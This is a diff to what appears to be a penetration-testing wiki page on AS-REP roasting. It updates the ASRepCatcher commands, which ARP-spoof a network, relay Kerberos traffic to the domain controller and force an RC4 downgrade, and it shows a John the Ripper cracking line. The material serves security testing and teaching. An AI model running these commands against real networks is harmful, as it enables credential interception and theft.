@@ -66,17 +66,17 @@ john --wordlist=$wordlist ASREProastables.txt
 
 ### ASREProast MitM
 
-Another way to conduct AS-REP roasting, without having to know the vulnerable users, would be to have a man-in-the-middle position on the network and catch AS-REPs. [ASrepCatcher](https://github.com/Yaxxine7/ASrepCatcher) (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).
+Another way to conduct AS-REP roasting, without relying on Kerberos pre-authentication being disabled, would be to have a man-in-the-middle position on the network and catch AS-REPs. [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) (Python) can be used for that purpose. It also has the ability to force client workstations to use RC4 (weaker encryption type) by altering the Kerberos negotiation process. The tool natively uses ARP spoofing (which can be disabled if needed).
 
 ```bash
 # Proxy between the clients and the DC, forcing RC4 downgrade if supported
-ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
+ASRepCatcher relay -dc $DC_IP
 
 # Disables ARP spoofing (the MitM must be obtained with other means)
-ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
+ASRepCatcher relay -dc $DC_IP --disable-spoofing
 
 # Passively listen for AS-REP packets, no packet alteration
-ASrepCatcher.py listen
+ASRepCatcher listen
 ```
 
 ## Resources
